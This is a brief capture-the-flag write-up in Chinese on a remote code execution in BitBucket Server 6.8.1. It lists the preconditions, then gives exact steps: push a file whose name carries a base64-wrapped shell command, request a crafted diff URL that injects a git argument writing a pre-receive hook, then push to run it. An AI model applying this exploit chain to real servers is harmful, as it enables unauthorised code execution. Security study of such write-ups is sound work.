# Shellbucket

Firstblood!

Demo: https://www.youtube.com/watch?v=IrwH0ALn9Vg

BitBucket Server 6.8.1 0day題

觸發這個RCE有兩個條件:
1. Public sign up is allowed
2. Project Creator permission is granted to stash-users group

重現步驟:
1. 註冊一個使用者並登入
2. 建立一個project和repo (e.g. project:`MYP`, repo:`testrepo`)
3. Push 一個檔案，檔名為``` `your_command` ``` (e.g. ``` `echo dG91Y2ggL3RtcC9rYWlicm9fcmNlCg==|base64 -d|sh` ```)
4. 訪問`/rest/api/latest/projects/MYP/repos/testrepo/diff/%60echo%20dG91Y2ggL3RtcC9rYWlicm9fcmNlCg%3D%3D%7Cbase64%20-d%7Csh%60?until=%20--output=hooks/pre-receive`會觸發 git command argument injection，並寫入git hooks
5. 隨便push一個commit，觸發git hooks
6. RCE

p.s. 結果最後發現是非預期解，然後有人比我們早丟Bounty XD
